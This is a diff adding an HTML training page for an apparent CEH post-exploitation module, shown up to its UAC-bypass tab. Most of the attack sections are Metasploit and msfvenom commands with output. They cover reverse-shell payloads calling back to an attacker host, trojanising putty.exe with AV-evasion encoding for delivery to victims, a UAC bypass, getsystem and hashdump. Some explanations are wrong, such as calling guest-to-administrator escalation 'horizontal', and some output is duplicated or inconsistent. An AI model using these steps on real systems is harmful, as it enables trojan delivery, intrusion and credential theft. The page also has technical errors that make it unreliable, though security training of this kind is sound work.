@@ -1,0 +1,1999 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>9_CEH - Post-Exploitation & Server Security</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="header">
+        <div class="header-content">
+            <h1 class="gradient-text">9_CEH Module</h1>
+            <p>Post-Exploitation Techniques & Server Security Architecture</p>
+        </div>
+    </div>
+
+    <div class="breadcrumb">
+        <span class="breadcrumb-item">CEH Training</span>
+        <span class="breadcrumb-separator">/</span>
+        <span class="breadcrumb-current">Module 9</span>
+    </div>
+
+    <div class="container">
+        <div class="sidebar">
+            <div class="sidebar-section">
+                <h3>Post-Exploitation</h3>
+                <ul class="sidebar-links">
+                    <li><a onclick="switchTab('intro')" data-tab="intro">Overview</a></li>
+                    <li><a onclick="switchTab('priv-arch')" data-tab="priv-arch">Privilege Architecture</a></li>
+                    <li><a onclick="switchTab('horizontal-priv')" data-tab="horizontal-priv">Horizontal Escalation</a></li>
+                    <li><a onclick="switchTab('vertical-priv')" data-tab="vertical-priv">Vertical Escalation</a></li>
+                    <li><a onclick="switchTab('payload-binding')" data-tab="payload-binding">Payload Binding</a></li>
+                </ul>
+            </div>
+
+            <div class="sidebar-section">
+                <h3>Advanced Techniques</h3>
+                <ul class="sidebar-links">
+                    <li><a onclick="switchTab('uac-bypass')" data-tab="uac-bypass">UAC Bypass</a></li>
+                    <li><a onclick="switchTab('exe-binding')" data-tab="exe-binding">EXE Binding Methods</a></li>
+                    <li><a onclick="switchTab('stealth-payloads')" data-tab="stealth-payloads">Stealth Payloads</a></li>
+                    <li><a onclick="switchTab('session-mgmt')" data-tab="session-mgmt">Session Management</a></li>
+                </ul>
+            </div>
+
+            <div class="sidebar-section">
+                <h3>Server Security</h3>
+                <ul class="sidebar-links">
+                    <li><a onclick="switchTab('ids-ips')" data-tab="ids-ips">IDS/IPS Detection</a></li>
+                    <li><a onclick="switchTab('web-servers')" data-tab="web-servers">Web Server Types</a></li>
+                    <li><a onclick="switchTab('apache')" data-tab="apache">Apache HTTP Server</a></li>
+                    <li><a onclick="switchTab('iis-nginx')" data-tab="iis-nginx">IIS vs NGINX</a></li>
+                </ul>
+            </div>
+
+            <div class="sidebar-section">
+                <h3>FTP Security</h3>
+                <ul class="sidebar-links">
+                    <li><a onclick="switchTab('ftp-basics')" data-tab="ftp-basics">FTP Fundamentals</a></li>
+                    <li><a onclick="switchTab('ftp-deployment')" data-tab="ftp-deployment">FTP Deployment</a></li>
+                    <li><a onclick="switchTab('auth-methods')" data-tab="auth-methods">Authentication Methods</a></li>
+                    <li><a onclick="switchTab('summary')" data-tab="summary">Completion</a></li>
+                </ul>
+            </div>
+
+            <div class="scroll-to-top" onclick="scrollToTop()">↑ Back to Top</div>
+        </div>
+
+        <div class="content">
+            <!-- Tab 1: Introduction -->
+            <div class="tab-content active" id="intro">
+                <h2>Module 9 Overview</h2>
+                <p class="subtitle">Post-Exploitation Techniques & Server Security Architecture</p>
+
+                <div class="info-card">
+                    <h3>Module Objectives</h3>
+                    <ul>
+                        <li><strong>Post-Exploitation Skills:</strong> Master privilege escalation techniques and payload optimization strategies</li>
+                        <li><strong>Advanced Evasion:</strong> Learn UAC bypass, payload binding, and stealth techniques</li>
+                        <li><strong>Server Architecture:</strong> Understand web server deployment and security models</li>
+                        <li><strong>Practical Defense:</strong> Implement IDS/IPS monitoring and secure FTP deployment</li>
+                    </ul>
+                </div>
+
+                <div class="learning-path">
+                    <strong>Learning Path:</strong>
+                    <div class="path-timeline">
+                        <div class="path-item">Privilege Analysis</div>
+                        <div class="path-arrow">→</div>
+                        <div class="path-item">Escalation Techniques</div>
+                        <div class="path-arrow">→</div>
+                        <div class="path-item">Stealth Operations</div>
+                        <div class="path-arrow">→</div>
+                        <div class="path-item">Defense & Mitigation</div>
+                    </div>
+                </div>
+
+                <div class="threat-spectrum">
+                    <strong>Attack Sophistication Scale:</strong>
+                    <div class="spectrum-visual">
+                        <div class="spectrum-item" data-threat="Low">Basic Privilege Escalation</div>
+                        <div class="spectrum-arrow">→</div>
+                        <div class="spectrum-item" data-threat="Medium">Payload Binding & Evasion</div>
+                        <div class="spectrum-arrow">→</div>
+                        <div class="spectrum-item" data-threat="High">UAC Bypass & Vertical Escalation</div>
+                        <div class="spectrum-arrow">→</div>
+                        <div class="spectrum-item" data-threat="Critical">Full System Compromise</div>
+                    </div>
+                </div>
+
+                <div class="warning-box">
+                    <h3>⚠️ Important Disclaimer</h3>
+                    <p>All techniques covered in this module are for <strong>authorized penetration testing only</strong>. Unauthorized access to computer systems is illegal. Always obtain written permission before conducting security assessments.</p>
+                </div>
+            </div>
+
+            <!-- Tab 2: Privilege Architecture -->
+            <div class="tab-content" id="priv-arch">
+                <h2>Privilege Escalation Architecture</h2>
+                <p class="subtitle">Understanding System Privilege Models</p>
+
+                <div class="concept-box">
+                    <h3>What is Privilege Escalation?</h3>
+                    <p>Privilege escalation refers to the techniques by which an attacker gains higher-level access than initially granted. After successful exploitation and initial shell access, attackers typically operate with limited permissions. The goal is to elevate these permissions to gain greater system control.</p>
+                </div>
+
+                <div class="info-card">
+                    <h3>Initial Shell State</h3>
+                    <p>When an attacker first gains access to a system, they typically receive limited permissions:</p>
+                    <ul>
+                        <li><strong>Current User Context:</strong> Guest or standard user account</li>
+                        <li><strong>Available Privileges:</strong> Restricted subset of system commands</li>
+                        <li><strong>Access Limitations:</strong> Cannot modify system files, registry, or run admin-level commands</li>
+                        <li><strong>Command Scope:</strong> Limited to user-writable directories and resources</li>
+                    </ul>
+                </div>
+
+                <div class="theory-card">
+                    <h3>Privilege Analysis Commands</h3>
+                    <div class="code-example">
+                        <h4>Enumerate Current Privileges (Windows)</h4>
+                        <pre>whoami                  # Current user identity
+whoami /priv           # List all available privileges
+whoami /groups         # Display user group memberships
+net user %username%    # Detailed user account info
+</pre>
+                    </div>
+                </div>
+
+                <div class="danger-box">
+                    <h3>Typical Initial Privileges (5-7 Common)</h3>
+                    <ul>
+                        <li><code>SeChangeNotifyPrivilege</code> - Traverse folder privilege</li>
+                        <li><code>SeIncreaseWorkingSet</code> - Increase working set size</li>
+                        <li><code>SeShutdownPrivilege</code> - Ability to shut down computer</li>
+                        <li><code>SeTimeZonePrivilege</code> - Change system time zone</li>
+                        <li><code>SeCreateSymbolicLinkPrivilege</code> - Create symbolic links</li>
+                        <li><code>SeImpersonatePrivilege</code> - Impersonate after access token creation</li>
+                    </ul>
+                </div>
+
+                <div class="warning-box">
+                    <h3>Restricted Commands in Guest Context</h3>
+                    <p>Without escalation, attackers cannot execute:</p>
+                    <ul>
+                        <li><code>hashdump</code> - Dump SAM/SYSTEM files</li>
+                        <li><code>reg query HKLM</code> - Access system registry</li>
+                        <li><code>diskpart list disk</code> - Access raw disk</li>
+                        <li><code>sc query</code> - Query system services</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Tab 3: Horizontal Privilege Escalation -->
+            <div class="tab-content" id="horizontal-priv">
+                <h2>Horizontal Privilege Escalation</h2>
+                <p class="subtitle">From Guest/User to Administrative Access</p>
+
+                <div class="concept-box">
+                    <h3>Horizontal vs Vertical Escalation</h3>
+                    <ul>
+                        <li><strong>Horizontal:</strong> Guest → User → Administrator (lateral privilege increase)</li>
+                        <li><strong>Result:</strong> More privileges but not complete system control</li>
+                        <li><strong>Scope:</strong> User-level administrative tasks available</li>
+                        <li><strong>Typical Outcome:</strong> 10-20 privileges instead of original 5</li>
+                    </ul>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Horizontal Escalation Attack Flow</h3>
+                    
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 1: Initial Access & Privilege Enumeration</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>Initial Shell Context:</strong></p>
+                            <code>C:\SomePath> whoami
+DESKTOP\guest_user
+
+C:\SomePath> whoami /priv
+Privileges for DESKTOP\guest_user
+========================
+Privilege Name                  State
+------------------------------- -------
+SeChangeNotifyPrivilege        Enabled
+SeIncreaseWorkingSet           Enabled
+SeShutdownPrivilege            Enabled
+(5 privileges total)
+</code>
+                            <p><strong>Key Observation:</strong> Limited privileges restrict access to system files and administrative features.</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 2: Exploit Vulnerable Service/Config</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>Common Horizontal Escalation Vectors:</strong></p>
+                            <ul>
+                                <li>Weak file permissions on privileged processes</li>
+                                <li>Unpatched service vulnerabilities</li>
+                                <li>Misconfigured scheduled tasks</li>
+                                <li>DLL hijacking opportunities</li>
+                                <li>Environment variable manipulation</li>
+                            </ul>
+                            <code>C:\SomePath> msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=192.168.31.27 LPORT=4444 -f exe -o exploit.exe</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 3: Gain Elevated Permissions</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>After Successful Exploitation:</strong></p>
+                            <code>meterpreter> shell
+Process 2456 created.
+Channel 1 created.
+
+C:\SomePath> whoami /priv
+Privileges for DESKTOP\elevated_user
+====================================
+SeProfileSingleProcessPrivilege         Enabled
+SeIncreaseQuotaPrivilege                Enabled
+SeSecurityPrivilege                     Enabled
+SeSystemEnvironmentPrivilege            Enabled
+SeSystemtimePrivilege                   Enabled
+SeTakeOwnershipPrivilege               Enabled
+SeTimeZonePrivilege                     Enabled
+SeCreatePagefilePrivilege               Enabled
+(15+ privileges total)
+</code>
+                            <p><strong>Result:</strong> Significantly expanded privilege set allowing access to more system resources.</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 4: Verify Expanded Capabilities</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>Testing Access to Previously Restricted Commands:</strong></p>
+                            <code>C:\SomePath> hashdump
+Dumping SAM database...
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+C:\SomePath> reg query HKLM\Software\Microsoft\Windows
+<Registry data returns successfully>
+
+C:\SomePath> diskpart list disk
+DISK 0 - 50 GB Online</code>
+                            <p><strong>Confirmation:</strong> Attacker now has access to SAM files, registry, and disk information.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="success-box">
+                    <h3>✓ Horizontal Escalation Success Indicators</h3>
+                    <ul>
+                        <li>Privilege count doubled (5 → 15+ privileges)</li>
+                        <li>Access to system registry (HKLM hive)</li>
+                        <li>Ability to run hashdump command</li>
+                        <li>Access to administrative shares (C$, ADMIN$)</li>
+                        <li>Can read protected system files</li>
+                    </ul>
+                </div>
+
+                <div class="info-card">
+                    <h3>Limitations of Horizontal Escalation</h3>
+                    <p>Despite significant privilege increase, horizontal escalation has bounds:</p>
+                    <ul>
+                        <li>Still restricted from certain kernel-level operations</li>
+                        <li>Cannot fully control system boot/shutdown</li>
+                        <li>Limited access to security identifiers (SIDs)</li>
+                        <li>User Account Control (UAC) may still interfere with actions</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Tab 4: Vertical Privilege Escalation -->
+            <div class="tab-content" id="vertical-priv">
+                <h2>Vertical Privilege Escalation</h2>
+                <p class="subtitle">Full System Administrator Access</p>
+
+                <div class="concept-box">
+                    <h3>Vertical Escalation Objective</h3>
+                    <p>Vertical privilege escalation aims to achieve complete system compromise by gaining SYSTEM or full Administrator privileges. This grants unrestricted access to all system resources, kernel-level operations, and complete control over the machine.</p>
+                </div>
+
+                <div class="danger-box">
+                    <h3>⚠️ Vertical Escalation Challenge: UAC</h3>
+                    <p><strong>User Account Control (UAC)</strong> is the primary barrier to vertical escalation on modern Windows systems. UAC prevents even administrators from performing certain actions without explicit user consent via a privilege escalation prompt.</p>
+                </div>
+
+                <div class="theory-card">
+                    <h3>Vertical Escalation Requirements</h3>
+                    <ul>
+                        <li><strong>Bypass UAC:</strong> Disable or circumvent User Account Control</li>
+                        <li><strong>Exploit Vulnerability:</strong> Target UAC bypass techniques (fodhelper.exe, eventvwr.exe, etc.)</li>
+                        <li><strong>Achieve SYSTEM Context:</strong> Run commands with SYSTEM-level privileges</li>
+                        <li><strong>Permanent Access:</strong> Establish persistence in elevated context</li>
+                    </ul>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Vertical Escalation via UAC Bypass</h3>
+                    
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 1: Horizontal Escalation (Foundation)</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code>meterpreter> sessions
+Active sessions
+===============
+Id  Type                   Information
+--  ----                   -----------
+1   meterpreter x86/win32  DESKTOP\user
+</code>
+                            <p>Start with active meterpreter session from horizontal escalation phase.</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 2: Background Initial Session</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code>meterpreter> background
+[*] Backgrounding session 1...
+
+msf6 exploit(multi/handler) > sessions 1
+[*] Session 1 running in background...
+</code>
+                            <p>Keep initial session active while launching new UAC bypass exploit.</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 3: Load UAC Bypass Exploit</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code>msf6 > use exploit/windows/local/bypassuac_eventvwr
+msf6 exploit(windows/local/bypassuac_eventvwr) > set SESSION 1
+msf6 exploit(windows/local/bypassuac_eventvwr) > set PAYLOAD windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/bypassuac_eventvwr) > set LHOST 192.168.31.27
+msf6 exploit(windows/local/bypassuac_eventvwr) > set LPORT 4445
+msf6 exploit(windows/local/bypassuac_eventvwr) > exploit
+</code>
+                            <p><strong>Available UAC Bypass Exploits:</strong></p>
+                            <ul>
+                                <li>bypassuac_eventvwr - Event Viewer COM interface</li>
+                                <li>bypassuac_fodhelper - FODhelper.exe registry manipulation</li>
+                                <li>bypassuac_slui_autoelevate - SLUI auto-elevation</li>
+                                <li>bypassuac_comhub - COM hijacking method</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 4: Verify SYSTEM Context & Full Privileges</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code>meterpreter (elevated)> getsystem
+Attempting to priv esc to SYSTEM...
+[+] Successfully obtained SYSTEM privileges
+
+meterpreter (SYSTEM)> getuid
+Server username: NT AUTHORITY\SYSTEM
+
+meterpreter (SYSTEM)> whoami /priv
+Privileges for NT AUTHORITY\SYSTEM
+==================================
+SeAssignPrimaryTokenPrivilege          Enabled
+SeAuditPrivilege                       Enabled
+SeBackupPrivilege                      Enabled
+SeChangeNotifyPrivilege                Enabled
+SeCreateGlobalPrivilege                Enabled
+SeCreatePagefilePrivilege              Enabled
+SeCreatePermanentPrivilege             Enabled
+SeCreateSymbolicLinkPrivilege          Enabled
+SeCreateTokenPrivilege                 Enabled
+SeDebugPrivilege                       Enabled
+SeImpersonatePrivilege                 Enabled
+SeIncreaseBasePriorityPrivilege        Enabled
+SeIncreaseQuotaPrivilege               Enabled
+SeImpersonatePrivilege                 Enabled
+SeLoadDriverPrivilege                  Enabled
+SeLoadDriverPrivilege                  Enabled
+(35+ privileges total - UNRESTRICTED)
+</code>
+                            <p><strong>Verification Commands:</strong></p>
+                            <code>meterpreter> hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+meterpreter> shell
+C:\Windows\System32> diskpart list disk
+DISK 0 - 50 GB Online
+
+C:\Windows\System32> reg query HKLM\Software\Microsoft\
+(Complete registry access)
+</code>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="success-box">
+                    <h3>✓ Vertical Escalation Complete - SYSTEM Achieved</h3>
+                    <ul>
+                        <li>35+ privileges granted (complete privilege set)</li>
+                        <li>NT AUTHORITY\SYSTEM context established</li>
+                        <li>Kernel-level operation capability enabled</li>
+                        <li>Full unrestricted system access confirmed</li>
+                        <li>SAM/SYSTEM file dumping capability operational</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Tab 5: Payload Binding -->
+            <div class="tab-content" id="payload-binding">
+                <h2>Payload Binding & Executable Fusion</h2>
+                <p class="subtitle">Disguising Malicious Payloads as Legitimate Applications</p>
+
+                <div class="concept-box">
+                    <h3>Why Payload Binding?</h3>
+                    <p>When an attacker delivers a raw payload executable, victims often observe suspicious behavior (no application opens, file runs in background). Modern payload binding techniques merge malicious code with legitimate executables to maintain user deception throughout the duration of exploitation.</p>
+                </div>
+
+                <div class="warning-box">
+                    <h3>Raw Payload Detection Problem</h3>
+                    <ul>
+                        <li><strong>No GUI Launch:</strong> File executes silently with no visible application</li>
+                        <li><strong>Victim Suspicion:</strong> User notices something is wrong immediately</li>
+                        <li><strong>Process Investigation:</strong> Victim checks Task Manager and kills unknown processes</li>
+                        <li><strong>Attack Window:</strong> Brief exploit window before victim discovers malware</li>
+                        <li><strong>Success Rate:</strong> Very low without additional obfuscation</li>
+                    </ul>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Payload Binding Attack Scenario</h3>
+                    
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 1: Download Legitimate Executable</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>Objective:</strong> Obtain a commonly used legitimate application that victim will recognize and trust.</p>
+                            <code>$ wget http://downloads.putty.org/putty.exe
+# Or use curl/wget to download from legitimate sources
+$ wget https://notepadplusplus.org/repository/7.x/7.9.5/npp.7.9.5.Installer.exe
+$ wget https://www.7-zip.org/a/7z1900.exe
+</code>
+                            <p><strong>Popular Legitimate Executables for Binding:</strong></p>
+                            <ul>
+                                <li>PuTTY (putty.exe) - SSH terminal client</li>
+                                <li>Notepad++ (npp.exe) - Text editor</li>
+                                <li>7-Zip (7z.exe) - File archiver</li>
+                                <li>VLC Media Player (vlc.exe) - Video player</li>
+                                <li>Adobe Reader (AcroRd32.exe) - PDF viewer</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 2: Create Payload with Binding Parameters</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code>$ msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=192.168.31.27 LPORT=4444 \
+  -x /path/to/putty.exe \
+  -k \
+  -e x86/shikata_ga_nai -i 5 \
+  -f exe -o payload_putty.exe
+</code>
+                            <p><strong>Command Parameters:</strong></p>
+                            <ul>
+                                <li><code>-p</code> - Payload type (reverse_tcp shell)</li>
+                                <li><code>LHOST</code> - Attacker IP for callback</li>
+                                <li><code>LPORT</code> - Attacker listening port</li>
+                                <li><code>-x</code> - Template executable to bind with</li>
+                                <li><code>-k</code> - Keep template functional (run original app)</li>
+                                <li><code>-e</code> - Encoder for AV evasion (shikata_ga_nai)</li>
+                                <li><code>-i</code> - Encoding iterations (5 passes)</li>
+                                <li><code>-f</code> - Output format (exe)</li>
+                                <li><code>-o</code> - Output filename</li>
+                            </ul>
+                            <p><strong>Key Parameter: -k Flag</strong></p>
+                            <p>The <code>-k</code> parameter is crucial - it tells msfvenom to keep the template application functional. This means:</p>
+                            <ul>
+                                <li>Original putty.exe launches normally to the user</li>
+                                <li>Payload runs silently in parallel</li>
+                                <li>User sees expected application behavior</li>
+                                <li>No suspicion raised during exploitation window</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 3: Set Up Listener on Attacker System</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code>$ msfconsole
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 192.168.31.27
+msf6 exploit(multi/handler) > set LPORT 4444
+msf6 exploit(multi/handler) > exploit
+[*] Started reverse TCP handler on 192.168.31.27:4444
+[*] Listening for incoming reverse TCP connections...
+</code>
+                            <p><strong>Handler waits for callback from bound payload</strong></p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 4: Deliver & Execute Bound Payload</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>Delivery Method:</strong> Email attachment or file share</p>
+                            <code>$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 ...
+</code>
+                            <p><strong>Victim Experience:</strong></p>
+                            <ul>
+                                <li>Receives file attachment "putty.exe"</li>
+                                <li>Double-clicks to run application</li>
+                                <li>PuTTY terminal window opens normally</li>
+                                <li>Victim uses PuTTY as expected (no suspicious behavior)</li>
+                            </ul>
+                            <p><strong>Meanwhile on Attacker Side:</strong></p>
+                            <code>[*] Sending stage (179779 bytes) to 192.168.1.100
+[*] Meterpreter session 1 opened (192.168.31.27:4444 -> 192.168.1.100:52341)
+
+meterpreter > sessions
+Active sessions
+===============
+Id  Type                   Information
+--  ----                   -----------
+1   meterpreter x86/win32  DESKTOP\victim
+</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 5: Execute Commands While App Runs</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code>meterpreter > shell
+Process 2456 created.
+Channel 1 created.
+
+C:\Users\victim\Downloads> dir
+putty.exe
+payload_putty.exe
+
+C:\Users\victim\Downloads> ipconfig
+Windows IP Configuration
+Ethernet adapter Ethernet:
+   IPv4 Address. . . . . . . . . . . . . : 192.168.1.100
+   Subnet Mask . . . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . . . : 192.168.1.1
+
+C:\Users\victim\Downloads> whoami
+DESKTOP\victim (standard user, no escalation yet)
+
+C:\Users\victim\Downloads> ps
+PuTTY SSH Client    - RUNNING
+cmd.exe            - RUNNING (attacker's shell)
+</code>
+                            <p><strong>Timing Analysis:</strong></p>
+                            <ul>
+                                <li>Victim interacting with PuTTY application - no suspicion</li>
+                                <li>Attacker has active shell in background</li>
+                                <li>Commands execute while original application visible to user</li>
+                                <li>Extended exploitation window achieved</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="success-box">
+                    <h3>✓ Payload Binding Success Metrics</h3>
+                    <ul>
+                        <li>Legitimate application launches without user suspicion</li>
+                        <li>Payload executes silently in parallel process</li>
+                        <li>Extended exploitation window (hours vs. minutes)</li>
+                        <li>Multiple commands executable before detection</li>
+                        <li>Higher success rate than raw payload delivery</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Tab 6: UAC Bypass Techniques -->
+            <div class="tab-content" id="uac-bypass">
+                <h2>User Account Control (UAC) Bypass</h2>
+                <p class="subtitle">Disabling Windows Security Prompts for Full System Access</p>
+
+                <div class="concept-box">
+                    <h3>Understanding UAC</h3>
+                    <p>User Account Control (UAC) is a Windows security feature that prompts users for explicit permission when applications attempt to make system-level changes. Even administrators cannot bypass this prompt without deliberately disabling UAC or exploiting a UAC bypass vulnerability.</p>
+                    <p><strong>UAC Dialog:</strong> "Do you want to allow this app to make changes to your PC?"</p>
+                </div>
+
+                <div class="info-card">
+                    <h3>UAC Bypass Significance</h3>
+                    <ul>
+                        <li><strong>Barrier to Vertical Escalation:</strong> UAC blocks even admin-level commands</li>
+                        <li><strong>Real-World Defense:</strong> Most organizations enable UAC by default</li>
+                        <li><strong>Exploitation Requirement:</strong> Attackers must disable UAC for vertical escalation</li>
+                        <li><strong>Detection Difficulty:</strong> UAC bypass techniques evolve rapidly</li>
+                    </ul>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>UAC Bypass Attack Flow</h3>
+                    
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 1: Initial Shell Access (Non-Admin)</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code>C:\Users\victim> whoami
+DESKTOP\victim
+
+C:\Users\victim> netstat -an | find "LISTENING"
+TCP    192.168.31.27:4444    ESTABLISHED (attacker connected)
+</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 2: Create UAC Bypass Payload</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code>$ msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=192.168.31.27 LPORT=4445 \
+  -e x86/shikata_ga_nai -i 5 \
+  -f exe -o payload_uac_bypass.exe
+
+[*] Payload generation successful
+</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 3: Set Up Handler for UAC Bypass Session</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code>msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 192.168.31.27
+msf6 exploit(multi/handler) > set LPORT 4445
+msf6 exploit(multi/handler) > exploit
+[*] Started reverse TCP handler on 192.168.31.27:4445
+[*] Waiting for connections...
+</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 4: Upload Bypass Payload to Target</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code>meterpreter (session 1)> upload /tmp/payload_uac_bypass.exe C:\\Users\\victim\\AppData\\Local\\Temp\\
+[*] Uploading  : /tmp/payload_uac_bypass.exe -> C:\Users\victim\AppData\Local\Temp\payload_uac_bypass.exe
+[*] Uploaded 327.00 KiB
+
+meterpreter > shell
+C:\Users\victim> cd %APPDATA%\Local\Temp
+C:\Users\victim\AppData\Local\Temp> dir
+payload_uac_bypass.exe
+</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 5: Execute UAC Bypass Exploit</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code>msf6 > use exploit/windows/local/bypassuac_eventvwr
+msf6 exploit(windows/local/bypassuac_eventvwr) > set SESSION 1
+msf6 exploit(windows/local/bypassuac_eventvwr) > set PAYLOAD windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/bypassuac_eventvwr) > set LHOST 192.168.31.27
+msf6 exploit(windows/local/bypassuac_eventvwr) > set LPORT 4445
+msf6 exploit(windows/local/bypassuac_eventvwr) > exploit
+[*] Started reverse TCP handler on 192.168.31.27:4445
+[*] Bypassing User Account Control (UAC) via eventvwr registry manipulation...
+[+] UAC bypass successful - launching payload with elevated privileges
+</code>
+                            <p><strong>UAC Bypass Methods:</strong></p>
+                            <ul>
+                                <li><code>bypassuac_eventvwr</code> - Event Viewer COM elevation</li>
+                                <li><code>bypassuac_fodhelper</code> - Fodhelper.exe registry hijacking</li>
+                                <li><code>bypassuac_comhub</code> - Component Object Manager bypass</li>
+                                <li><code>bypassuac_slui</code> - Service Logon UI privilege escalation</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 6: Confirm SYSTEM Access & Full Privileges</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code>[*] Meterpreter session 2 opened (192.168.31.27:4445 -> 192.168.1.100:52456)
+
+meterpreter (session 2)> getsystem
+[+] Got SYSTEM privileges
+
+meterpreter (SYSTEM)> getuid
+Server username: NT AUTHORITY\SYSTEM
+
+meterpreter (SYSTEM)> shell
+C:\Windows\system32> whoami /priv
+Privileges for NT AUTHORITY\SYSTEM
+===================================
+SeDebugPrivilege                       Enabled
+SeImpersonatePrivilege                 Enabled
+SeLoadDriverPrivilege                  Enabled
+SeRestorePrivilege                     Enabled
+SeShutdownPrivilege                    Enabled
+(35+ privileges - UNRESTRICTED)
+
+C:\Windows\system32> hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+victim:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+</code>
+                            <p><strong>UAC Bypass Confirmation:</strong> System now operates with SYSTEM privileges without any UAC prompts.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="success-box">
+                    <h3>✓ UAC Bypass Complete - Vertical Escalation Achieved</h3>
+                    <ul>
+                        <li>UAC completely bypassed - no prompts interfere</li>
+                        <li>SYSTEM context successfully established</li>
+                        <li>All 35+ privileges available without restriction</li>
+                        <li>SAM/SYSTEM file dumping operational</li>
+                        <li>Full system compromise capability achieved</li>
+                    </ul>
+                </div>
+            </div>
+
